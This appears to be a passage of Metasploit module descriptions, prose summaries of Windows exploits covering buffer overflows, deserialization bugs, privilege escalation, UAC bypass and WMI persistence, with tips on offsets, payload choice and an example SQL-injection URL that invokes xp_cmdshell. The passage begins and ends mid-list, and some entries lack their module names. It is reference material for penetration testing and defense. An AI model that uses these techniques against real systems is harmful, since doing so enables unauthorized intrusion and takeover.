This module exploits a stack buffer overflow in Alt-N MDaemon SMTP server for versions 6.8.5 and earlier. When WorldClient HTTP server is installed (default), a CGI script is provided to accept html FORM based emails and deliver via MDaemon.exe, by writing the CGI output to the Raw Queue. When X-FromCheck is enabled (also default), the temporary form2raw.cgi data is copied by MDaemon.exe and a stack based overflow occurs when an excessively long From field is specified. The RawQueue is processed every 1 minute by default, to a maximum of 60 minutes. Keep this in mind when choosing payloads or setting WfsDelay... You'll need to wait. Furthermore, this exploit uses a direct memory jump into a nopsled (which isn't very reliable). Once the payload is written into the Raw Queue by Form2Raw, MDaemon will continue to crash/execute the payload until the CGI output is manually deleted from the queue in C:\MDaemon\RawFiles\*.raw.

windows/http/oracle_btm_writetofile
This module exploits abuses the FlashTunnelService SOAP web service on Oracle Business Transaction Management 12.1.0.7 to upload arbitrary files, without authentication, using the WriteToFile method. The same method contains a directory traversal vulnerability, which allows to upload the files to arbitrary locations. In order to execute remote code two techniques are provided. If the Oracle app has been deployed in the same WebLogic Samples Domain a JSP can be uploaded to the web root. If a new Domain has been used to deploy the Oracle application, the Windows Management Instrumentation service can be used to execute arbitrary code. Both techniques have been successfully tested on default installs of Oracle BTM 12.1.0.7, Weblogic 12.1.1 and Windows 2003 SP2. Default path traversal depths are provided, but the user can configure the traversal depth using the DEPTH option.

windows/http/oracle_event_processing_upload
This module exploits an arbitrary file upload vulnerability in Oracle Event Processing 11.1.1.7.0. The FileUploadServlet component, which requires no authentication, can be abused to upload a malicious file onto an arbitrary location due to a directory traversal flaw, and compromise the server. By default Oracle Event Processing uses a Jetty Application Server without JSP support, which limits the attack to WbemExec. The current WbemExec technique only requires arbitrary write to the file system, but at the moment the module only supports Windows 2003 SP2 or older.

After setting the Windows only Plex variable LocalAppDataPath to the newly created photo library, a file named Dict will be unpickled, which causes an RCE as the user who started Plex. Plex_Token is required, to get it you need to log-in through a web browser, then check the requests to grab the X-Plex-Token header. See info -d for additional details. If an exploit fails, or is cancelled, Dict is left on disk, a new ALBUM_NAME will be required as subsuquent writes will make Dict-1, and not execute.

A remotely exploitable vulnerability exists within SharePoint that can be leveraged by a remote authenticated attacker to execute code within the context of the SharePoint application service. The privileges in this execution context are determined by the account that is specified when SharePoint is installed and configured. The vulnerability is related to a failure to validate the source of XML input data, leading to an unsafe deserialization operation that can be triggered from a page that initializes either the ContactLinksSuggestionsMicroView type or a derivative of it. In a default configuration, a Domain User account is sufficient to access SharePoint and exploit this vulnerability.

Versions 7.2.6 and earlier and 9.0 and later are not affected. The vulnerability occurs due to Report.ashx's handler, located in Sitecore.Xdb.Client.dll under the Sitecore.sitecore.shell.ClientBin.Reporting.Report defintion, having a ProcessRequest() handler that calls ProcessReport() with the context of the attacker's request without properly checking if the attacker is authenticated or not. This request then causes ReportDataSerializer.DeserializeQuery() to be called, which will end up calling the DeserializeParameters() function of Sitecore.Analytics.Reporting.ReportDataSerializer, if a "parameters" XML tag is found in the attacker's request. Then for each subelement named "parameter", the code will check that it has a name and if it does, it will call NetDataContractSerializer().ReadObject on it. NetDataContractSerializer is vulnerable to deserialization attacks and can be trivially exploited by using the TypeConfuseDelegate gadget chain. By exploiting this vulnerability, an attacker can gain arbitrary code execution as the user that IIS is running as, aka NT AUTHORITY\NETWORK SERVICE. Users can then use technique 4 of the "getsystem" command to use RPCSS impersonation and get SYSTEM level code execution.

windows/http/smartermail_rce
This module exploits a vulnerability in the SmarterTools SmarterMail software for version numbers <= 16.x or for build numbers < 6985. The vulnerable versions and builds expose three .NET remoting endpoints on port 17001, namely /Servers, /Mail and /Spool. For example, a typical installation of SmarterMail Build 6970 will have the /Servers endpoint exposed to the public at tcp://0.0.0.0:17001/Servers, where serialized .NET commands can be sent through a TCP socket connection. The three endpoints perform deserialization of untrusted data (CVE-2019-7214), allowing an attacker to send arbitrary commands to be deserialized and executed. This module exploits this vulnerability to perform .NET deserialization attacks, allowing remote code execution for any unauthenticated user under the context of the SYSTEM account. Successful exploitation results in full administrative control of the target server under the NT AUTHORITY\SYSTEM account. This vulnerability was patched in Build 6985, where the 17001 port is no longer publicly accessible, although it can be accessible locally at 127.0.0.1:17001. Hence, this would still allow for a privilege escalation vector if the server is compromised as a low-privileged user.

windows/http/solarwinds_fsm_userlogin
This module exploits multiple vulnerabilities found in Solarwinds Firewall Security Manager 6.6.5. The first vulnerability is an authentication bypass via the Change Advisor interface due to a user-controlled session.putValue API in userlogin.jsp, allowing the attacker to set the 'username' attribute before authentication. The second problem is that the settings-new.jsp file will only check the 'username' attribute before authorizing the 'uploadFile' action, which can be exploited and allows the attacker to upload a fake xls host list file to the server, and results in arbitrary code execution under the context of SYSTEM.

windows/http/trendmicro_officescan_widget_exec
This module exploits the authentication bypass and command injection vulnerability together. Unauthenticated users can execute a terminal command under the context of the web server user. The specific flaw exists within the management interface, which listens on TCP port 443 by default. The Trend Micro Officescan product has a widget feature which is implemented with PHP. Talker.php takes ack and hash parameters but doesn't validate these values, which leads to an authentication bypass for the widget. Proxy.php files under the mod TMCSS folder take multiple parameters but the process does not properly validate a user-supplied string before using it to execute a system call. Due to combination of these vulnerabilities, unauthenticated users can execute a terminal command under the context of the web server user.

windows/http/ultraminihttp_bof
This module exploits a stack based buffer overflow in Ultra Mini HTTPD 1.21, allowing remote attackers to execute arbitrary code via a long resource name in an HTTP request. This exploit has to deal with the fact that the application's request handler thread is terminated after 60 seconds by a "monitor" thread. To do this, it allocates some RWX memory, copies the payload to it and creates another thread. When done, it terminates the current thread so that it doesn't crash and hence doesn't bring down the process with it.

windows/http/umbraco_upload_aspx
This module can be used to execute a payload on Umbraco CMS 4.7.0.378. The payload is uploaded as an ASPX script by sending a specially crafted SOAP request to codeEditorSave.asmx, which permits unauthorized file upload via the SaveDLRScript operation. SaveDLRScript is also subject to a path traversal vulnerability, allowing code to be placed into the web-accessible /umbraco/ directory. The module writes, executes and then overwrites an ASPX script; note that though the script content is removed, the file remains on the target. Automatic cleanup of the file is intended if a meterpreter payload is used. This module has been tested successfully on Umbraco CMS 4.7.0.378 on a Windows 7 32-bit SP1. In this scenario, the "IIS APPPOOL\ASP.NET v4.0" user must have write permissions on the Windows Temp folder.

MDAC versions affected include MDAC 1.5, 2.0, 2.0 SDK, 2.1 and systems with the MDAC Sample Pages for RDS installed, and NT4 Servers with the NT Option Pack installed or upgraded 2000 systems often running IIS3/4/5 however some vulnerable installations can still be found on newer Windows operating systems. Note that newer releases of msadcs.dll can still be abused however by default remote connections to the RDS is denied. Consider using VERBOSE if you're unable to successfully execute a command, as the error messages are detailed and useful for debugging. Also set NAME to obtain the remote hostname, and METHOD to use the alternative VbBusObj technique.

windows/local/anyconnect_lpe
The installer component of Cisco AnyConnect Secure Mobility Client for Windows prior to 4.8.02042 is vulnerable to path traversal and allows local attackers to create/overwrite files in arbitrary locations with system level privileges. The installer component of Cisco AnyConnect Secure Mobility Client for Windows prior to 4.9.00086 is vulnerable to a DLL hijacking and allows local attackers to execute code on the affected machine with with system level privileges. Both attacks consist in sending a specially crafted IPC request to the TCP port 62522 on the loopback device, which is exposed by the Cisco AnyConnect Secure Mobility Agent service. This service will then launch the vulnerable installer component (`vpndownloader`), which copies itself to an arbitrary location (CVE-2020-3153) or with a supplied DLL (CVE-2020-3433) before being executed with system privileges. Since `vpndownloader` is also vulnerable to DLL hijacking, a specially crafted DLL (`dbghelp.dll`) is created at the same location `vpndownloader` will be copied to get code execution with system privileges.

windows/local/bits_ntlm_token_impersonation
This module exploit BITS behavior which tries to connect to the local Windows Remote Management server (WinRM) every times it starts. The module launches a fake WinRM server which listen on port 5985 and triggers BITS. When BITS starts, it tries to authenticate to the Rogue WinRM server, which allows to steal a SYSTEM token. This token is then used to launch a new process as SYSTEM user. In the case of this exploit, notepad.exe is launched as SYSTEM. Then, it write shellcode in its previous memory space and trigger its execution. As this exploit uses reflective dll injection, it does not write any file on the disk. See /documentation/modules/exploit/windows/local/bits_ntlm_token_impersonation.md for complementary words of information. Vulnerable operating systems are Windows 10 and Windows servers where WinRM is not running. Lab experiments has shown that Windows 7 does not exhibit the vulnerable behavior.

This module will bypass Windows UAC by creating COM handler registry entries in the HKCU hive. When certain high integrity processes are loaded, these registry entries are referenced resulting in the process loading user-controlled DLLs.

This module requires the architecture of the payload to match the OS, but the current low-privilege Meterpreter session architecture can be different. If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process. This module invokes the target binary via cmd.exe on the target. Therefore if cmd.exe access is restricted, this module will not run correctly.

windows/local/cve_2020_17136
The Cloud Filter driver, cldflt.sys, on Windows 10 v1803 and later, prior to the December 2020 updates, did not set the IO_FORCE_ACCESS_CHECK or OBJ_FORCE_ACCESS_CHECK flags when calling FltCreateFileEx() and FltCreateFileEx2() within its HsmpOpCreatePlaceholders() function with attacker controlled input. This meant that files were created with KernelMode permissions, thereby bypassing any security checks that would otherwise prevent a normal user from being able to create files in directories they don't have permissions to create files in. This module abuses this vulnerability to perform a DLL hijacking attack against the Microsoft Storage Spaces SMP service, which grants the attacker code execution as the NETWORK SERVICE user. Users are strongly encouraged to set the PAYLOAD option to one of the Meterpreter payloads, as doing so will allow them to subsequently escalate their new session from NETWORK SERVICE to SYSTEM by using Meterpreter's "getsystem" command to perform RPCSS Named Pipe Impersonation and impersonate the SYSTEM user.

windows/local/cve_2021_40449
A use after free vulnerability exists in the `NtGdiResetDC()` function of Win32k which can be leveraged by an attacker to escalate privileges to those of `NT AUTHORITY\SYSTEM`. The flaw exists due to the fact that this function calls `hdcOpenDCW()`, which performs a user mode callback. During this callback, attackers can call the `NtGdiResetDC()` function again with the same handle as before, which will result in the PDC object that is referenced by this handle being freed. The attacker can then replace the memory referenced by the handle with their own object, before passing execution back to the original `NtGdiResetDC()` call, which will now use the attacker's object without appropriate validation. This can then allow the attacker to manipulate the state of the kernel and, together with additional exploitation techniques, gain code execution as NT AUTHORITY\SYSTEM. This module has been tested to work on Windows 10 x64 RS1 (build 14393) and RS5 (build 17763), however previous versions of Windows 10 will likely also work.

windows/local/cve_2022_21882_win32k
A vulnerability exists within win32k that can be leveraged by an attacker to escalate privileges to those of NT AUTHORITY\SYSTEM. The flaw exists in how the WndExtra field of a window can be manipulated into being treated as an offset despite being populated by an attacker-controlled value. This can be leveraged to achieve an out of bounds write operation, eventually leading to privilege escalation. This flaw was originally identified as CVE-2021-1732 and was patched by Microsoft on February 9th, 2021. In early 2022, a technique to bypass the patch was identified and assigned CVE-2022-21882. The root cause is is the same for both vulnerabilities. This exploit combines the patch bypass with the original exploit to function on a wider range of Windows 10 targets.

windows/local/cve_2022_21999_spoolfool_privesc
The Windows Print Spooler has a privilege escalation vulnerability that can be leveraged to achieve code execution as SYSTEM. The `SpoolDirectory`, a configuration setting that holds the path that a printer's spooled jobs are sent to, is writable for all users, and it can be configured via `SetPrinterDataEx()` provided the caller has the `PRINTER_ACCESS_ADMINISTER` permission. If the `SpoolDirectory` path does not exist, it will be created once the print spooler reinitializes. Calling `SetPrinterDataEx()` with the `CopyFiles\` registry key will load the dll passed in as the `pData` argument, meaning that writing a dll to the `SpoolDirectory` location can be loaded by the print spooler. Using a directory junction and UNC path for the `SpoolDirectory`, the exploit writes a payload to `C:\Windows\System32\spool\drivers\x64\4` and loads it by calling `SetPrinterDataEx()`, resulting in code execution as SYSTEM.

windows/local/cve_2022_26904_superprofile
The user profile service, identified as ProfSrv, is vulnerable to a local privilege elevation vulnerability in its CreateDirectoryJunction() function due to a lack of appropriate checks on the directory structure of the junctions it tries to link together. Attackers can leverage this vulnerability to plant a malicious DLL in a system directory and then trigger a UAC prompt to cause this DLL to be loaded and executed by ProfSrv as the NT AUTHORITY\SYSTEM user. Note that this bug was originally identified as CVE-2021-34484 and was subsequently patched a second time as CVE-2022-21919, however both patches were found to be insufficient. This bug is a patch bypass for CVE-2022-21919 and at the time of publishing, has not yet been patched, though plans are in place to patch it as CVE-2022-26904. It is important to note that the credentials supplied for the second user to log in as in this exploit must be those of a normal non-admin user and these credentials must also corralate with a user who has already logged in at least once before. Additionally the current user running the exploit must have UAC set to the highest level, aka "Always Notify Me When", in order for the code to be executed as NT AUTHORITY\SYSTEM. Note however that "Always Notify Me When" is the default UAC setting on common Windows installs, so this would only affect instances where this setting has been changed either manually or as part of the installation process.

windows/local/cve_2023_28252_clfs_driver
A privilege escalation vulnerability exists in the clfs.sys driver which comes installed by default on Windows 10 21H2, Windows 11 21H2 and Windows Server 20348 operating systems. The clfs.sys driver contains a function CreateLogFile that is used to create open and edit '*.blf' (base log format) files. Inside a .blf file there are multiple blocks of data which contain checksums to verify the integrity of the .blf file and to ensure the file looks and acts like a .blf file. However, these files can be edited with CreateFileA or with fopen and then modified with WriteFile or fwrite respectively in order to change the contents of the file and update their checksums accordingly. This exploit makes use to two different kinds of specially crafted .blf files that are edited using the technique mentioned above. There are multiple spray .blf files. The spray .blf files are specially crafted to initiate an out of bounds read which reads from a contiguous block of memory. The block of memory it reads from contains a read-write pipe that points to the address of the second type of .blf file - the trigger .blf file. The trigger .blf file is specially crafted read the SYSTEM token and write it in the process of the exploit to achieve the local privilege escalation. The exploits creates a controlled memory space by first looping over the CreatePipe function to to create thousands of read-write pipes (which take up 0x90 bytes of memory). It then releases a certain number of pipes from memory and calls CreateLogFile to open the pre-existing spray .blf files which when being opened fill the 0x90 byte gaps created by the deallocation of the pipes in memory, creating the controlled memory space. This is a very brief and high overview description of what the exploit is actually doing. For a more detailed and in depth analysis please refer to the following [reference](https://github.com/fortra/CVE-2023-28252).

windows/local/dnsadmin_serverlevelplugindll
This module exploits a feature in the DNS service of Windows Server. Users of the DnsAdmins group can set the `ServerLevelPluginDll` value using dnscmd.exe to create a registry key at `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\` named `ServerLevelPluginDll` that can be made to point to an arbitrary DLL. After doing so, restarting the service will load the DLL and cause it to execute, providing us with SYSTEM privileges. Increasing WfsDelay is recommended when using a UNC path. Users should note that if the DLLPath variable of this module is set to a UNC share that does not exist, the DNS server on the target will not be able to restart. Similarly if a UNC share is not utilized, and users instead opt to drop a file onto the disk of the target computer, and this gets picked up by Anti-Virus after the timeout specified by `AVTIMEOUT` expires, its possible that the `ServerLevelPluginDll` value of the `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\` key on the target computer may point to an nonexistant DLL, which will also prevent the DNS server from being able to restart. Users are advised to refer to the documentation for this module for advice on how to resolve this issue should it occur. This module has only been tested and confirmed to work on Windows Server 2019 Standard Edition, however it should work against any Windows Server version up to and including Windows Server 2019.

windows/local/ntapphelpcachecontrol
On Windows, the system call NtApphelpCacheControl (the code is actually in ahcache.sys) allows application compatibility data to be cached for quick reuse when new processes are created. A normal user can query the cache but cannot add new cached entries as the operation is restricted to administrators. This is checked in the function AhcVerifyAdminContext. This function has a vulnerability where it doesn't correctly check the impersonation token of the caller to determine if the user is an administrator. It reads the caller's impersonation token using PsReferenceImpersonationToken and then does a comparison between the user SID in the token to LocalSystem's SID. It doesn't check the impersonation level of the token so it's possible to get an identify token on your thread from a local system process and bypass this check. This module currently only affects Windows 8 and Windows 8.1, and requires access to C:\Windows\System\ComputerDefaults.exe (although this can be improved).

windows/local/razer_zwopenprocess
A vulnerability exists in the latest version of Razer Synapse (v2.20.15.1104 as of the day of disclosure) which can be leveraged locally by a malicious application to elevate its privileges to those of NT_AUTHORITY\SYSTEM. The vulnerability lies in a specific IOCTL handler in the rzpnk.sys driver that passes a PID specified by the user to ZwOpenProcess. This can be issued by an application to open a handle to an arbitrary process with the necessary privileges to allocate, read and write memory in the specified process. This exploit leverages this vulnerability to open a handle to the winlogon process (which runs as NT_AUTHORITY\SYSTEM) and infect it by installing a hook to execute attacker controlled shellcode. This hook is then triggered on demand by calling user32!LockWorkStation(), resulting in the attacker's payload being executed with the privileges of the infected winlogon process. In order for the issued IOCTL to work, the RazerIngameEngine.exe process must not be running. This exploit will check if it is, and attempt to kill it as necessary. The vulnerable software can be found here: https://www.razerzone.com/synapse/. No Razer hardware needs to be connected in order to leverage this vulnerability. This exploit is not opsec-safe due to the user being logged out as part of the exploitation process.

windows/local/srclient_dll_hijacking
All editions of Windows Server 2012 (but not 2012 R2) are vulnerable to DLL hijacking due to the way TiWorker.exe will try to call the non-existent `SrClient.dll` file when Windows Update checks for updates. This issue can be leveraged for privilege escalation if %PATH% includes directories that are writable by low-privileged users. The attack can be triggered by any low-privileged user and does not require a system reboot. This module has been successfully tested on Windows Server 2012 (x64).

windows/local/unquoted_service_path
This module exploits a logic flaw due to how the lpApplicationName parameter is handled. When the lpApplicationName contains a space, the file name is ambiguous. Take this file path as example: C:\program files\hello.exe; The Windows API will try to interpret this as two possible paths: C:\program.exe, and C:\program files\hello.exe, and then execute all of them. To some software developers, this is an unexpected behavior, which becomes a security problem if an attacker is able to place a malicious executable in one of these unexpected paths, sometimes escalate privileges if run as SYSTEM. Some software such as OpenVPN 2.1.1, OpenSSH Server 5, and others have the same problem. The offensive technique is also described in Writing Secure Code (2nd Edition), Chapter 23, in the section "Calling Processes Security" on page 676. This technique was previously called Trusted Service Path, but is more commonly known as Unquoted Service Path. The service exploited won't start until the payload written to disk is removed.

windows/local/wmi_persistence
This module will create a permanent WMI event subscription to achieve file-less persistence using one of five methods. The EVENT method will create an event filter that will query the event log for an EVENT_ID_TRIGGER (default: failed logon request id 4625) that also contains a specified USERNAME_TRIGGER (note: failed logon auditing must be enabled on the target for this method to work, this can be enabled using "auditpol.exe /set /subcategory:Logon /failure:Enable"). When these criteria are met a command line event consumer will trigger an encoded powershell payload. The INTERVAL method will create an event filter that triggers the payload after the specified CALLBACK_INTERVAL. The LOGON method will create an event filter that will trigger the payload after the system has an uptime of 4 minutes. The PROCESS method will create an event filter that triggers the payload when the specified process is started. The WAITFOR method creates an event filter that utilizes the Microsoft binary waitfor.exe to wait for a signal specified by WAITFOR_TRIGGER before executing the payload. The signal can be sent from a windows host on a LAN utilizing the waitfor.exe command (note: requires target to have port 445 open). Additionally a custom command can be specified to run once the trigger is activated using the advanced option CUSTOM_PS_COMMAND. This module requires administrator level privileges as well as a high integrity process. It is also recommended not to use stageless payloads due to powershell script length limitations.

This module will execute an arbitrary payload on an "ESEL" server used by the AIS logistic software. The server typically listens on port 5099 without TLS. There could also be server listening on 5100 with TLS but the port 5099 is usually always open. The login process is vulnerable to an SQL Injection. Usually a MSSQL Server with the 'sa' user is in place. This module was verified on version 67 but it should also run on lower versions. An fixed version was created by AIS in September 2017. However most systems have not been updated. In regard to the payload, unless there is a closed port in the web server, you dont want to use any "bind" payload. You want a "reverse" payload, probably to your port 80 or to any other outbound port allowed on the firewall. Currently, one delivery method is supported This method takes advantage of the Command Stager subsystem. This allows using various techniques, such as using a TFTP server, to send the executable. By default the Command Stager uses 'wcsript.exe' to generate the executable on the target. NOTE: This module will leave a payload executable on the target system when the attack is finished.

This module exploits a vulnerability in Firebird SQL Server. A specially crafted packet can be sent which will overwrite a pointer allowing the attacker to control where data is read from. Shortly, following the controlled read, the pointer is called resulting in code execution. The vulnerability exists with a group number extracted from the CNCT information, which is sent by the client, and whose size is not properly checked. This module uses an existing call to memcpy, just prior to the vulnerable code, which allows a small amount of data to be written to the stack. A two-phases stack pivot allows to execute the ROP chain which ultimately is used to execute VirtualAlloc and bypass DEP.

windows/misc/hp_dataprotector_new_folder
This module exploits a stack buffer overflow in HP Data Protector 5. The overflow occurs in the creation of new folders, where the name of the folder is handled in a insecure way by the dpwindtb.dll component. While the overflow occurs in the stack, the folder name is split in fragments in this insecure copy. Because of this, this module uses egg hunting to search a non corrupted copy of the payload in the heap. On the other hand the overflowed buffer is stored in a frame protected by stack cookies, because of this SEH handler overwrite is used. Any user of HP Data Protector Express is able to create new folders and trigger the vulnerability. Moreover, in the default installation the 'Admin' user has an empty password. Successful exploitation will lead to code execution with the privileges of the "dpwinsdr.exe" (HP Data Protector Express Domain Server Service) process, which runs as SYSTEM by default.

This service is installed with HP OpenView Data Protector, HP Application Recovery Manager and potentially other products. This exploit has been tested against versions 6.1, 6.0, and 5.50 of Data Protector. and versions 6.0 and 6.1 of Application Recovery Manager. NOTE: There are actually two consecutive wcscpy() calls in the program (which may be why ZDI considered them two separate issues). However, this module only exploits the first one.

windows/misc/itunes_extm3u_bof
This module exploits a stack buffer overflow in iTunes 10.4.0.80 to 10.6.1.7. When opening an extended .m3u file containing an "#EXTINF:" tag description, iTunes will copy the content after "#EXTINF:" without appropriate checking from a heap buffer to a stack buffer, writing beyond the stack buffer's boundary, which allows code execution under the context of the user. Please note before using this exploit, you must have precise knowledge of the victim machine's QuickTime version (if installed), and then select your target accordingly. In addition, even though this exploit can be used as remote, you should be aware the victim's browser behavior when opening an itms link. For example, IE/Firefox/Opera by default will ask the user for permission before launching the itms link by iTunes. Chrome will ask for permission, but also spits a warning. Safari would be an ideal target, because it will open the link without any user interaction.

windows/misc/vmhgfs_webdav_dll_sideload
A DLL side loading vulnerability was found in the VMware Host Guest Client Redirector, a component of VMware Tools. This issue can be exploited by luring a victim into opening a document from the attacker's share. An attacker can exploit this issue to execute arbitrary code with the privileges of the target user. This can potentially result in the attacker taking complete control of the affected system. If the WebDAV Mini-Redirector is enabled, it is possible to exploit this issue over the internet.

windows/misc/webdav_delivery
This module simplifies the rundll32.exe Application Whitelisting Bypass technique. The module creates a webdav server that hosts a dll file. When the user types the provided rundll32 command on a system, rundll32 will load the dll remotly and execute the provided export function. The export function needs to be valid, but the default meterpreter function can be anything. The process does write the dll to C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV but does not load the dll from that location. This file should be removed after execution. The extension can be anything you'd like, but you don't have to use one. Two files will be written to disk. One named the requested name and one with a dll extension attached.

windows/mssql/ms09_004_sp_replwritetovarbin
A heap-based buffer overflow can occur when calling the undocumented "sp_replwritetovarbin" extended stored procedure. This vulnerability affects all versions of Microsoft SQL Server 2000 and 2005, Windows Internal Database, and Microsoft Desktop Engine (MSDE) without the updates supplied in MS09-004. Microsoft patched this vulnerability in SP3 for 2005 without any public mention. An authenticated database session is required to access the vulnerable code. That said, it is possible to access the vulnerable code via an SQL injection vulnerability. This exploit smashes several pointers, as shown below. 1. pointer to a 32-bit value that is set to 0 2. pointer to a 32-bit value that is set to a length influenced by the buffer length. 3. pointer to a 32-bit value that is used as a vtable pointer. In MSSQL 2000, this value is referenced with a displacement of 0x38. For MSSQL 2005, the displacement is 0x10. The address of our buffer is conveniently stored in ecx when this instruction is executed. 4. On MSSQL 2005, an additional vtable ptr is smashed, which is referenced with a displacement of 4. This pointer is not used by this exploit. This particular exploit replaces the previous dual-method exploit. It uses a technique where the value contained in ecx becomes the stack. From there, return oriented programming is used to normalize the execution state and finally execute the payload via a "jmp esp". All addresses used were found within the sqlservr.exe memory space, yielding very reliable code execution using only a single query. NOTE: The MSSQL server service does not automatically restart by default. That said, some exceptions are caught and will not result in terminating the process. If the exploit crashes the service prior to hijacking the stack, it won't die. Otherwise, it's a goner.

windows/mssql/mssql_linkcrawler
This module can be used to crawl MS SQL Server database links and deploy Metasploit payloads through links configured with sysadmin privileges using a valid SQL Server Login. If you are attempting to obtain multiple reverse shells using this module we recommend setting the "DisablePayloadHandler" advanced option to "true", and setting up a exploit/multi/handler to run in the background as a job to support multiple incoming shells. If you are interested in deploying payloads to specific servers this module also supports that functionality via the "DEPLOYLIST" option. Currently, the module is capable of delivering payloads to both 32bit and 64bit Windows systems via powershell memory injection methods based on Matthew Graeber's work. As a result, the target server must have powershell installed. By default, all of the crawl information is saved to a CSV formatted log file and MSF loot so that the tool can also be used for auditing without deploying payloads.

windows/mssql/mssql_payload
This module executes an arbitrary payload on a Microsoft SQL Server by using the "xp_cmdshell" stored procedure. Currently, three delivery methods are supported. First, the original method uses Windows 'debug.com'. File size restrictions are avoided by incorporating the debug bypass method presented by SecureStat at Defcon 17. Since this method invokes ntvdm, it is not available on x64 systems. A second method takes advantage of the Command Stager subsystem. This allows using various techniques, such as using a TFTP server, to send the executable. By default the Command Stager uses 'wcsript.exe' to generate the executable on the target. Finally, ReL1K's latest method utilizes PowerShell to transmit and recreate the payload on the target.

windows/mssql/mssql_payload_sqli
This module will execute an arbitrary payload on a Microsoft SQL Server, using a SQL injection vulnerability. Once a vulnerability is identified this module will use xp_cmdshell to upload and execute Metasploit payloads. It is necessary to specify the exact point where the SQL injection vulnerability happens. For example, given the following injection: http://www.example.com/show.asp?id=1;exec xp_cmdshell 'dir';--&cat=electrical you would need to set the following path: set GET_PATH /showproduct.asp?id=1;[SQLi];--&cat=foobar In regard to the payload, unless there is a closed port in the web server, you dont want to use any "bind" payload, specially on port 80, as you will stop reaching the vulnerable web server host. You want a "reverse" payload, probably to your port 80 or to any other outbound port allowed on the firewall. For privileged ports execute Metasploit msfconsole as root. Currently, three delivery methods are supported. First, the original method uses Windows 'debug.com'.

windows/pop3/seattlelab_pass
There exists an unauthenticated buffer overflow vulnerability in the POP3 server of Seattle Lab Mail 5.5 when sending a password with excessive length. Successful exploitation should not crash either the service or the server; however, after initial use the port cannot be reused for successive exploitation until the service has been restarted. Consider using a command execution payload following the bind shell to restart the service if you need to reuse the same port. The overflow appears to occur in the debugging/error reporting section of the slmail.exe executable, and there are multiple offsets that will lead to successful exploitation. This exploit uses 2606, the offset that creates the smallest overall payload. The other offset is 4654. The return address is overwritten with a "jmp esp" call from the application library SLMFC.DLL found in %SYSTEM%\system32\. This return address works against all version of Windows and service packs. The last modification date on the library is dated 06/02/99. Assuming that the code where the overflow occurs has not changed in some time, prior version of SLMail may also be vulnerable with this exploit. The author has not been able to acquire older versions of SLMail for testing purposes. Please let us know if you were able to get this exploit working against other SLMail versions.

The RDP termdd.sys driver improperly handles binds to internal-only channel MS_T120, allowing a malformed Disconnect Provider Indication message to cause use-after-free. With a controllable data/size remote nonpaged pool spray, an indirect call gadget of the freed channel is used to achieve arbitrary code execution. Windows 7 SP1 and Windows Server 2008 R2 are the only currently supported targets. Windows 7 SP1 should be exploitable in its default configuration, assuming your target selection is correctly matched to the system's memory layout. HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\Winstations\RDP-Tcp\fDisableCam *needs* to be set to 0 for exploitation to succeed against Windows Server 2008 R2. This is a non-standard configuration for normal servers, and the target will crash if the aforementioned Registry key is not set! If the target is crashing regardless, you will likely need to determine the non-paged pool base in kernel memory and set it as the GROOMBASE option.

windows/scada/igss9_igssdataserver_listall
This module exploits a vulnerability in the igssdataserver.exe component of 7-Technologies IGSS up to version 9.00.00 b11063. While processing a ListAll command, the application fails to do proper bounds checking before copying data into a small buffer on the stack. This causes a buffer overflow and allows to overwrite a structured exception handling record on the stack, allowing for unauthenticated remote code execution. Also, after the payload exits, IGSSdataServer.exe should automatically recover.

windows/scada/igss9_igssdataserver_rename
This module exploits a vulnerability found on 7-Technologies IGSS 9. By supplying a long string of data to the 'Rename' (0x02), 'Delete' (0x03), or 'Add' (0x04) command, a buffer overflow condition occurs in IGSSdataServer.exe while handing an RMS report, which results arbitrary code execution under the context of the user. The attack is carried out in three stages. The first stage sends the final payload to IGSSdataServer.exe, which will remain in memory. The second stage sends the Add command so the process can find a valid ID for the Rename command. The last stage then triggers the vulnerability with the Rename command, and uses an egghunter to search for the shellcode that we sent in stage 1. The use of egghunter appears to be necessary due to the small buffer size, which cannot even contain our ROP chain and the final payload.

Windows 2000 SP4 Rollup 1 also patches this vulnerability. You are only allowed one attempt with this vulnerability. If the payload fails to execute, the LSASS system service will crash and the target system will automatically reboot itself in 60 seconds. If the payload succeeds, the system will no longer be able to process authentication requests, denying all attempts to login through SMB or at the console. A reboot is required to restore proper functioning of an exploited system. This exploit has been successfully tested with the win32/*/reverse_tcp payloads, however a few problems were encountered when using the equivalent bind payloads. Your mileage may vary.

windows/smb/ms06_025_rasmans_reg
This module exploits a registry-based stack buffer overflow in the Windows Routing and Remote Access Service. Since the service is hosted inside svchost.exe, a failed exploit attempt can cause other system services to fail as well. A valid username and password is required to exploit this flaw on Windows 2000. When attacking XP SP1, the SMBPIPE option needs to be set to 'SRVSVC'. Exploiting this flaw involves two distinct steps - creating the registry key and then triggering an overwrite based on a read of this key. Once the key is created, it cannot be recreated. This means that for any given system, you only get one chance to exploit this flaw. Picking the wrong target will require a manual removal of the following registry key before you can try again: HKEY_USERS\.DEFAULT\Software\Microsoft\RAS Phonebook

This module exploits a stack buffer overflow in the NetApi32 CanonicalizePathName() function using the NetpwPathCanonicalize RPC call in the Server Service. It is likely that other RPC calls could be used to exploit this service. This exploit will result in a denial of service on Windows XP SP2 or Windows 2003 SP1. A failed exploit attempt will likely result in a complete reboot on Windows 2000 and the termination of all SMB-related services on Windows XP. The default target for this exploit should succeed on Windows NT 4.0, Windows 2000 SP0-SP4+, Windows XP SP0-SP1 and Windows 2003 SP0.

windows/smb/ms06_070_wkssvc
This module exploits a stack buffer overflow in the NetApi32 NetpManageIPCConnect function using the Workstation service in Windows 2000 SP4 and Windows XP SP2. In order to exploit this vulnerability, you must specify the name of a valid Windows DOMAIN. It may be possible to satisfy this condition by using a custom DNS and LDAP setup, however that method is not covered here. Although Windows XP SP2 is vulnerable, Microsoft reports that Administrator credentials are required to reach the vulnerable code. Windows XP SP1 only requires valid user credentials. Also, testing shows that a machine already joined to a domain is not exploitable.

windows/smb/ms10_061_spoolss
